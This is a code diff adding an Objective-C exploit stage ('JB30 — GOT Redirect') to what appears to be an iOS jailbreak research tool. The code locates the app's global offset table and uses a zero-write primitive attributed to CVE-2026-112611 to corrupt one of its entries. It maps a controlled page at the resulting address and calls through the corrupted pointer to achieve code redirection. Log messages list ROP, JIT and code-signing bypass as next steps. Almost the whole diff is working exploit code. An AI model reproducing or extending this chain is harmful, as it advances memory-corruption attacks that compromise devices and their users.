@@ -31016,3 +31016,507 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// ==========================================================================
+// JB30 — GOT Redirect: zero-write GOT entry -> redirect to controlled page
+// Full exploit chain: CVE-2026-112611 + GOT corruption + code redirect
+// ==========================================================================
+
+void iosurface_got_redirect(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB30: === GOT Redirect — full exploit chain ===");
+        log(@"JB30: CVE-2026-112611 zero-write -> GOT entry -> code redirect");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        extern void jb25_setup(void);
+        extern volatile unsigned long jb25_far;
+        extern volatile unsigned long jb25_esr;
+        extern volatile int jb25_sig;
+        extern volatile sig_atomic_t jb25_in_probe;
+        extern struct jb25_jb_holder *jb25_jb_ptr;
+        jb25_setup();
+
+        // =====================================================================
+        // FASE 1: Locate our GOT and find a safe target entry
+        // =====================================================================
+        log(@"JB30: === Fase 1: Locate GOT entries ===");
+
+        uint32_t imgCount = _dyld_image_count();
+        const struct mach_header_64 *mainMH = NULL;
+        intptr_t mainSlide = 0;
+
+        for (uint32_t img = 0; img < imgCount; img++) {
+            const char *name = _dyld_get_image_name(img);
+            if (name && strstr(name, "IOSurfaceSafeProbe")) {
+                mainMH = (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+                mainSlide = _dyld_get_image_vmaddr_slide(img);
+                log([NSString stringWithFormat:@"JB30:   Main binary at %#llx slide=%#lx",
+                     (uint64_t)(uintptr_t)mainMH, (unsigned long)mainSlide]);
+                break;
+            }
+        }
+
+        if (!mainMH || mainMH->magic != MH_MAGIC_64) {
+            log(@"JB30: [!] Can't find main binary");
+            done(results);
+            return;
+        }
+
+        // Find __DATA_CONST.__got section
+        uint64_t gotAddr = 0;
+        size_t gotCount = 0;
+
+        const struct load_command *lc =
+            (const struct load_command *)((const char *)mainMH + sizeof(*mainMH));
+        for (uint32_t k = 0; k < mainMH->ncmds && lc; k++) {
+            if (lc->cmd == LC_SEGMENT_64) {
+                const struct segment_command_64 *sc = (const void *)lc;
+                const struct section_64 *sec =
+                    (const struct section_64 *)((const char *)sc + sizeof(*sc));
+                for (uint32_t s = 0; s < sc->nsects; s++) {
+                    if (strstr(sec[s].sectname, "got")) {
+                        gotAddr = sec[s].addr + mainSlide;
+                        gotCount = sec[s].size / 8;
+                        log([NSString stringWithFormat:@"JB30:   GOT at %#llx (%zu entries)",
+                             gotAddr, gotCount]);
+                    }
+                }
+            }
+            lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+        }
+
+        if (!gotAddr || !gotCount) {
+            log(@"JB30: [!] Can't find GOT section");
+            done(results);
+            return;
+        }
+
+        results[@"gotAddr"] = [NSString stringWithFormat:@"%#llx", gotAddr];
+        results[@"gotCount"] = @(gotCount);
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: Resolve a GOT entry and analyze its address
+        // =====================================================================
+        log(@"JB30: === Fase 2: Resolve GOT entry ===");
+
+        // Call getpid to force its GOT entry to be resolved
+        typedef int (*getpid_fn)(void);
+        getpid_fn realGetpid = dlsym(RTLD_DEFAULT, "getpid");
+        int myPid = realGetpid();
+        log([NSString stringWithFormat:@"JB30:   pid = %d, getpid = %#llx", myPid, (uint64_t)(uintptr_t)realGetpid]);
+
+        // Scan GOT for entries pointing to dyld cache (resolved entries)
+        uint64_t *got = (uint64_t *)(uintptr_t)gotAddr;
+        int resolvedCount = 0;
+        int unresolvedCount = 0;
+        uint64_t targetGotEntry = 0;
+        size_t targetGotIdx = 0;
+        uint64_t targetOrigVal = 0;
+
+        jb25_far = 0; jb25_sig = 0;
+        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+            jb25_in_probe = 1;
+            for (size_t i = 0; i < gotCount && i < 918; i++) {
+                uint64_t val = got[i];
+                uint32_t high32 = (uint32_t)(val >> 32);
+
+                if (high32 >= 0x2 && high32 <= 0x3) {
+                    // Resolved: points to dyld cache (0x2xxxxxxxx range)
+                    resolvedCount++;
+                    // Pick an entry — prefer one that matches getpid's high bits
+                    if (!targetGotEntry && high32 == (uint32_t)((uint64_t)(uintptr_t)realGetpid >> 32)) {
+                        targetGotEntry = gotAddr + i * 8;
+                        targetGotIdx = i;
+                        targetOrigVal = val;
+                    }
+                } else if (high32 == 0x1) {
+                    // Unresolved: points to stub helper in our binary
+                    unresolvedCount++;
+                }
+            }
+            jb25_in_probe = 0;
+        } else {
+            jb25_in_probe = 0;
+            log([NSString stringWithFormat:@"JB30:   [!] FAULT reading GOT: sig=%d", jb25_sig]);
+        }
+
+        log([NSString stringWithFormat:@"JB30:   Resolved: %d  Unresolved: %d", resolvedCount, unresolvedCount]);
+
+        // If no entry with matching high32, pick the first resolved one
+        if (!targetGotEntry) {
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                for (size_t i = 0; i < gotCount; i++) {
+                    uint64_t val = got[i];
+                    uint32_t high32 = (uint32_t)(val >> 32);
+                    if (high32 >= 0x2 && high32 <= 0x3) {
+                        targetGotEntry = gotAddr + i * 8;
+                        targetGotIdx = i;
+                        targetOrigVal = val;
+                        break;
+                    }
+                }
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+            }
+        }
+
+        if (!targetGotEntry) {
+            log(@"JB30: [!] No resolved GOT entry found — trying unresolved");
+            // Use first unresolved (high32=1)
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                for (size_t i = 0; i < gotCount; i++) {
+                    uint64_t val = got[i];
+                    if ((val >> 32) >= 0x1) {
+                        targetGotEntry = gotAddr + i * 8;
+                        targetGotIdx = i;
+                        targetOrigVal = val;
+                        break;
+                    }
+                }
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+            }
+        }
+
+        uint32_t targetHigh32 = (uint32_t)(targetOrigVal >> 32);
+        uint64_t redirectAddr = (uint64_t)targetHigh32 << 32; // After zeroing low4
+
+        log([NSString stringWithFormat:@"JB30:   Target GOT[%zu] at %#llx", targetGotIdx, targetGotEntry]);
+        log([NSString stringWithFormat:@"JB30:   Original value = %#018llx", targetOrigVal]);
+        log([NSString stringWithFormat:@"JB30:   After zero-low4 = %#018llx", redirectAddr]);
+
+        results[@"targetGotIdx"] = @(targetGotIdx);
+        results[@"targetGotEntry"] = [NSString stringWithFormat:@"%#llx", targetGotEntry];
+        results[@"targetOrigVal"] = [NSString stringWithFormat:@"%#llx", targetOrigVal];
+        results[@"redirectAddr"] = [NSString stringWithFormat:@"%#llx", redirectAddr];
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: Map our controlled page at the redirect address
+        // =====================================================================
+        log(@"JB30: === Fase 3: Map controlled page ===");
+
+        size_t pageSize = 0x10000; // 64KB
+        void *controlledPage = mmap((void *)(uintptr_t)redirectAddr, pageSize,
+                                     PROT_READ | PROT_WRITE,
+                                     MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
+
+        if (controlledPage == MAP_FAILED) {
+            log([NSString stringWithFormat:@"JB30: [!] mmap(MAP_FIXED, %#llx) FAILED errno=%d", redirectAddr, errno]);
+            results[@"mmapOK"] = @(0);
+            done(results);
+            return;
+        }
+
+        log([NSString stringWithFormat:@"JB30: [+] mmap(MAP_FIXED) at %#llx SUCCEEDED", redirectAddr]);
+        results[@"mmapOK"] = @(1);
+
+        // Fill with a known pattern — NOP sled equivalent for detection
+        // On arm64: 0xD503201F = NOP, 0xD65F03C0 = RET
+        // We fill with RET instructions so if execution reaches here, it returns
+        uint32_t *codePage = (uint32_t *)controlledPage;
+        for (size_t i = 0; i < pageSize / 4; i++) {
+            codePage[i] = 0xD65F03C0; // RET
+        }
+
+        // Also try to make it executable (likely fails on iOS but worth trying)
+        int mprotRet = mprotect(controlledPage, pageSize, PROT_READ | PROT_EXEC);
+        log([NSString stringWithFormat:@"JB30:   mprotect(RX) = %d (errno=%d)", mprotRet, mprotRet ? errno : 0]);
+        results[@"rxOK"] = @(mprotRet == 0);
+
+        if (mprotRet != 0) {
+            // Can't make executable — redirect will fault at our page
+            // But the fault address PROVES the redirect worked
+            log(@"JB30:   W^X enforced — redirect will fault at our page");
+            log(@"JB30:   We detect success by checking FAR == redirect address");
+
+            // Remap as RW for the marker pattern
+            mprotect(controlledPage, pageSize, PROT_READ | PROT_WRITE);
+
+            // Write a marker pattern at offset 0 for verification
+            uint64_t *marker = (uint64_t *)controlledPage;
+            marker[0] = 0x4A42333043484E41ULL; // "ANCHJB30" in ASCII
+            marker[1] = 0x5245444952455054ULL; // "TPREDIRE"
+        }
+
+        if (isr_stopped()) { munmap(controlledPage, pageSize); done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Zero-write the GOT entry (THE EXPLOIT)
+        // =====================================================================
+        log(@"JB30: === Fase 4: Zero-write GOT entry (CVE-2026-112611) ===");
+
+        // Verify GOT entry still has original value
+        uint64_t preWrite = 0;
+        jb25_far = 0; jb25_sig = 0;
+        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+            jb25_in_probe = 1;
+            preWrite = *(volatile uint64_t *)(uintptr_t)targetGotEntry;
+            jb25_in_probe = 0;
+        } else {
+            jb25_in_probe = 0;
+        }
+        log([NSString stringWithFormat:@"JB30:   GOT[%zu] pre-write = %#018llx", targetGotIdx, preWrite]);
+
+        if (preWrite != targetOrigVal) {
+            log(@"JB30:   [!] GOT entry changed since scan — using current value");
+            targetOrigVal = preWrite;
+            targetHigh32 = (uint32_t)(targetOrigVal >> 32);
+            redirectAddr = (uint64_t)targetHigh32 << 32;
+        }
+
+        // FIRE THE EXPLOIT: zero-write low 4 bytes of the GOT entry
+        log([NSString stringWithFormat:@"JB30: >>> FIRING CVE-2026-112611 at GOT[%zu] (%#llx) <<<",
+             targetGotIdx, targetGotEntry]);
+
+        jb27_zero_write(targetGotEntry, log);
+
+        // Wait for the write to complete
+        log(@"JB30:   Waiting for write to complete...");
+        usleep(500000); // 500ms
+
+        // Read back the GOT entry
+        uint64_t postWrite = 0;
+        jb25_far = 0; jb25_sig = 0;
+        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+            jb25_in_probe = 1;
+            postWrite = *(volatile uint64_t *)(uintptr_t)targetGotEntry;
+            jb25_in_probe = 0;
+        } else {
+            jb25_in_probe = 0;
+            log([NSString stringWithFormat:@"JB30:   [!] FAULT reading GOT post-write: sig=%d", jb25_sig]);
+        }
+
+        log([NSString stringWithFormat:@"JB30:   GOT[%zu] post-write = %#018llx", targetGotIdx, postWrite]);
+        results[@"postWrite"] = [NSString stringWithFormat:@"%#llx", postWrite];
+
+        int gotModified = (postWrite != targetOrigVal) ? 1 : 0;
+        int low4Zeroed = ((postWrite & 0xFFFFFFFFULL) == 0) ? 1 : 0;
+        results[@"gotModified"] = @(gotModified);
+        results[@"low4Zeroed"] = @(low4Zeroed);
+
+        if (gotModified) {
+            log([NSString stringWithFormat:@"JB30: [!!!] GOT ENTRY MODIFIED! low4zeroed=%d", low4Zeroed]);
+            log([NSString stringWithFormat:@"JB30: [!!!] Before: %#018llx -> After: %#018llx",
+                 targetOrigVal, postWrite]);
+
+            if (low4Zeroed) {
+                log([NSString stringWithFormat:@"JB30: [!!!] GOT entry now points to %#018llx (our page!)",
+                     postWrite]);
+            }
+        } else {
+            log(@"JB30:   GOT entry unchanged — write may need more time or different offset");
+            log(@"JB30:   Trying second write with offset adjustment...");
+
+            // The write primitive zeros 4 bytes at addr+0x76c offset from base
+            // Try writing directly (the offset is already calculated in jb27_zero_write)
+            jb27_zero_write(targetGotEntry, log);
+            usleep(500000);
+
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                postWrite = *(volatile uint64_t *)(uintptr_t)targetGotEntry;
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+            }
+
+            log([NSString stringWithFormat:@"JB30:   GOT[%zu] after 2nd write = %#018llx", targetGotIdx, postWrite]);
+            gotModified = (postWrite != targetOrigVal) ? 1 : 0;
+            low4Zeroed = ((postWrite & 0xFFFFFFFFULL) == 0) ? 1 : 0;
+            results[@"gotModified"] = @(gotModified);
+            results[@"low4Zeroed"] = @(low4Zeroed);
+        }
+
+        if (isr_stopped()) { munmap(controlledPage, pageSize); done(results); return; }
+
+        // =====================================================================
+        // FASE 5: Trigger the redirect (if GOT was modified)
+        // =====================================================================
+        log(@"JB30: === Fase 5: Trigger redirect ===");
+
+        if (gotModified && low4Zeroed) {
+            log(@"JB30:   GOT corrupted! Attempting to call through it...");
+
+            // Read the function pointer from the corrupted GOT entry
+            uint64_t corruptedPtr = postWrite;
+            log([NSString stringWithFormat:@"JB30:   Corrupted fptr = %#018llx", corruptedPtr]);
+
+            // If page is executable, calling it should execute RET and return
+            // If not executable, it faults at our address (proving redirect)
+            jb25_far = 0; jb25_esr = 0; jb25_sig = 0;
+
+            int redirectConfirmed = 0;
+            int codeExec = 0;
+
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+
+                // Call through the corrupted pointer
+                typedef int (*void_fn)(void);
+                void_fn fn = (void_fn)(uintptr_t)corruptedPtr;
+                int ret = fn();
+
+                jb25_in_probe = 0;
+                codeExec = 1;
+                log([NSString stringWithFormat:@"JB30: [!!!!] CODE EXECUTION! fn() returned %d", ret]);
+                log(@"JB30: [!!!!] FULL EXPLOIT CHAIN SUCCESSFUL!");
+                log(@"JB30: [!!!!] CVE-2026-112611 -> GOT corrupt -> code redirect -> EXEC");
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB30:   FAULT: sig=%d far=%#018lx esr=%#018lx",
+                     jb25_sig, jb25_far, jb25_esr]);
+
+                // Check if fault address is in our controlled page
+                uint64_t faultAddr = jb25_far;
+                if (faultAddr >= redirectAddr && faultAddr < redirectAddr + pageSize) {
+                    redirectConfirmed = 1;
+                    log(@"JB30: [!!!] REDIRECT CONFIRMED! Fault at OUR page!");
+                    log([NSString stringWithFormat:@"JB30: [!!!] FAR=%#018lx is in our mmap [%#llx-%#llx]",
+                         jb25_far, redirectAddr, redirectAddr + pageSize]);
+                    log(@"JB30: [!!!] W^X prevents execution but redirect WORKS");
+                    log(@"JB30: Siguiente: ROP chain o JIT para ejecutar desde nuestra página");
+                } else {
+                    log(@"JB30:   Fault NOT at our page — redirect may not have worked");
+                    log([NSString stringWithFormat:@"JB30:   Expected FAR near %#llx, got %#018lx",
+                         redirectAddr, jb25_far]);
+                }
+            }
+
+            results[@"redirectConfirmed"] = @(redirectConfirmed);
+            results[@"codeExec"] = @(codeExec);
+
+            // RESTORE the GOT entry to prevent further crashes
+            log(@"JB30:   Restoring GOT entry...");
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                *(volatile uint64_t *)(uintptr_t)targetGotEntry = targetOrigVal;
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB30:   GOT restored to %#018llx", targetOrigVal]);
+            } else {
+                jb25_in_probe = 0;
+                log(@"JB30:   [!] Can't restore GOT entry");
+            }
+        } else {
+            log(@"JB30:   GOT not modified — testing direct write as fallback");
+
+            // Test: can we directly write to the GOT entry?
+            uint64_t testVal = redirectAddr; // What we want it to be
+            jb25_far = 0; jb25_sig = 0;
+            int directWriteOK = 0;
+
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                uint64_t saved = *(volatile uint64_t *)(uintptr_t)targetGotEntry;
+                *(volatile uint64_t *)(uintptr_t)targetGotEntry = testVal;
+                uint64_t readback = *(volatile uint64_t *)(uintptr_t)targetGotEntry;
+                *(volatile uint64_t *)(uintptr_t)targetGotEntry = saved; // restore
+                jb25_in_probe = 0;
+
+                directWriteOK = (readback == testVal) ? 1 : 0;
+                log([NSString stringWithFormat:@"JB30:   Direct GOT write: wrote %#llx, read %#llx — %s",
+                     testVal, readback, directWriteOK ? "OK!" : "FAILED"]);
+
+                if (directWriteOK) {
+                    log(@"JB30: [+] GOT is directly writable from userspace!");
+                    log(@"JB30: [+] No need for CVE — can corrupt GOT with memcpy!");
+
+                    // NOW do the actual redirect test
+                    log(@"JB30:   Corrupting GOT and triggering redirect...");
+
+                    *(volatile uint64_t *)(uintptr_t)targetGotEntry = redirectAddr;
+
+                    jb25_far = 0; jb25_esr = 0; jb25_sig = 0;
+                    int redirectOK = 0;
+                    int execOK = 0;
+
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        typedef int (*void_fn)(void);
+                        void_fn fn = (void_fn)(uintptr_t)redirectAddr;
+                        int ret = fn();
+                        jb25_in_probe = 0;
+                        execOK = 1;
+                        log([NSString stringWithFormat:@"JB30: [!!!!] CODE EXEC at redirect! ret=%d", ret]);
+                    } else {
+                        jb25_in_probe = 0;
+                        uint64_t fa = jb25_far;
+                        if (fa >= redirectAddr && fa < redirectAddr + pageSize) {
+                            redirectOK = 1;
+                            log(@"JB30: [!!!] REDIRECT CONFIRMED via direct write!");
+                            log([NSString stringWithFormat:@"JB30: [!!!] FAR=%#018lx in our page!", jb25_far]);
+                        } else {
+                            log([NSString stringWithFormat:@"JB30:   Fault not at our page: far=%#018lx", jb25_far]);
+                        }
+                    }
+
+                    // Restore
+                    *(volatile uint64_t *)(uintptr_t)targetGotEntry = targetOrigVal;
+                    log(@"JB30:   GOT restored");
+
+                    results[@"directWriteRedirect"] = @(redirectOK);
+                    results[@"directWriteExec"] = @(execOK);
+                }
+            } else {
+                jb25_in_probe = 0;
+                log(@"JB30:   [!] Direct GOT write FAULTED — truly read-only");
+                results[@"gotTrulyReadOnly"] = @(1);
+            }
+
+            results[@"directWriteOK"] = @(directWriteOK);
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB30: =============================================");
+
+        int codeExec = [results[@"codeExec"] intValue];
+        int redirectOK = [results[@"redirectConfirmed"] intValue];
+        int directExec = [results[@"directWriteExec"] intValue];
+        int directRedirect = [results[@"directWriteRedirect"] intValue];
+
+        NSString *verdict = @"ANALYSIS_COMPLETE";
+
+        if (codeExec || directExec) {
+            verdict = @"FULL_CODE_EXECUTION";
+            log(@"JB30: [!!!!] FULL CODE EXECUTION ACHIEVED!");
+            log(@"JB30: CVE-2026-112611 + GOT redirect = complete chain");
+        } else if (redirectOK || directRedirect) {
+            verdict = @"REDIRECT_CONFIRMED_NEED_RX";
+            log(@"JB30: [!!!] GOT REDIRECT CONFIRMED — faulted at our page");
+            log(@"JB30: W^X prevents exec — need ROP/JOP or JIT for final step");
+            log(@"JB30: Opciones:");
+            log(@"JB30:   1) ROP chain: stack pivot + gadgets in dyld cache");
+            log(@"JB30:   2) JIT: pthread_jit_write_protect_np (if available)");
+            log(@"JB30:   3) CS bypass: zero-write CS flags then mprotect(RX)");
+        } else if ([results[@"gotModified"] intValue]) {
+            verdict = @"GOT_MODIFIED_NEED_ALIGNMENT";
+            log(@"JB30: GOT modified but redirect not at expected address");
+        } else {
+            verdict = @"ZERO_WRITE_MISSED_GOT";
+            log(@"JB30: Zero-write did not hit GOT — may need offset adjustment");
+            log(@"JB30: GOT at %@, write target needs precise alignment", results[@"gotAddr"]);
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB30: Verdict: %@", verdict]);
+        log(@"JB30: =============================================");
+
+        munmap(controlledPage, pageSize);
+        isr_checkpoint(@"JB30-got-redirect-checkpoint.json", results);
+        done(results);
+    });
+}
